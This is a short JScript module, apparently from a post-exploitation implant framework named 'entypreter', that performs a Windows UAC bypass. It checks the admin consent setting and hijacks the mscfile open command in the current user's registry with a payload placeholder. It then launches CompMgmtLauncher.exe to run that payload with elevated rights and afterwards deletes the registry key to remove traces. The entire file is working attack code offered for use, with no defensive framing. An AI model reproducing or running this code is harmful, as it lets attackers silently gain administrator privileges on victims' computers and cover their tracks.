try
{
    // not sure if this is needed, but it can't hurt, right?
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = entypreter.registry.read(entypreter.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", entypreter.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }

    var path = 'Software\\Classes\\mscfile\\shell\\open\\command';
    entypreter.registry.write(entypreter.registry.HKCU, path, '', '~PAYLOAD_DATA~', entypreter.registry.STRING);

    entypreter.shell.run("CompMgmtLauncher.exe", true);

    entypreter.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (entypreter.registry.destroy(entypreter.registry.HKCU, path, "") != 0)
    {
        entypreter.shell.run("reg delete HKCU\\"+path+" /f", true);
    }
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
